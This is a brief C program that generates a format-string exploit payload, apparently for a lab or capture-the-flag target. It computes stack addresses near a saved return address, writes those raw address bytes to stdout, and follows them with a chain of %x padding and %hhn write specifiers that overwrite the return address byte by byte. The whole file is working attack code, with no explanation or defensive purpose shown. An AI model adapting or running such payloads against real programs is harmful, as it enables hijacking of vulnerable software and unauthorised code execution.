#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main (int argc, const char * argv[]) {
	int i;
	void * number2 = (void *)0xffffd214; // second number from genesp
	void * stringPointer = (void *)0x8048670;
	if (argc == 2) {
		number2 = (void *)strtoul(argv[1], NULL, 0);
	}
	// right under this will be the return address
	unsigned int number2Addr = (unsigned int)number2;
	unsigned int espNumber = (((number2Addr - 60) + 4) & 0xfffffff0) - 128;
	void * esp = (void *)espNumber;
	void * overwriteFirst = (void *)(esp - 4);
	void * overwriteSecond = (void *)(esp - 3);
	printf("~/abc  #");
	fwrite((const char *)&overwriteSecond, 4, 1, stdout);
	printf("%%%%16x");
	fwrite((const char *)&overwriteFirst, 4, 1, stdout);
	printf("%%%%12x%%%%8x%%%%8x%%%%8x%%%%8x%%%%8x%%%%8x%%%%8x%%%%13x%%%%8x%%%%12x%%%%hhn%%%%9x%%%%hhn");//%%%%hhn%%%%93x%%%%hhn"); //%%%%hhn");
}
